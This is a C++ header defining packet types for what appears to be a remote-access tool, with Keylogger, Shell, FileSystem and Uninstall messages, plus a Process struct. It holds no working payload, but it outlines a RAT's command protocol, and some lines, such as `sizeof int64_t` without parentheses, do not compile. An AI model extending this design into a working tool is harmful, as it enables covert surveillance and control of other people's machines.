#pragma once
#ifndef PACKET_DEFINITIONS_H
#define PACKET_DEFINITIONS_H

#define KILOBYTE (1000 * sizeof(char))
#define MEGABYTE (1000 * KILOBYTE)
#define MAX_PACKET_LENGTH MEGABYTE * 20

#define PACKET_SIZE_LENGTH sizeof int64_t
#define PACKET_TYPE_LENGTH sizeof int16_t
#define PACKET_HEADER_LENGTH (PACKET_SIZE_LENGTH + PACKET_TYPE_LENGTH)

#include <cstdint>
#include <map>
#include <iostream>

enum class PacketType : int16_t
{
	Invalid = -1,
	Presentation,
	ClientInformation,
	Process,
	Chat,
	Keylogger,
	FileSystem,
	Shell,
	Uninstall,

	MinPacketTypeValue = Presentation,
	MaxPacketTypeValue = Uninstall,
};


inline std::basic_ostream<char>& operator<<(std::basic_ostream<char>& stream, PacketType value)
{
	if (value == PacketType::Presentation)
		stream << "Presentation";
	return stream;
}

typedef struct Process
{
	std::wstring path;
	uint64_t pid;
	bool hasUi;
	std::wstring title;
	std::vector<char> icon;

	/*
private:
	friend class boost::serialization::access;

	template <typename Archive>
	void serialize(Archive& ar, const unsigned int version)
	{
		ar& pid & path & hasUi & title & icon;
	}
	*/

}* PProcess;

#endif
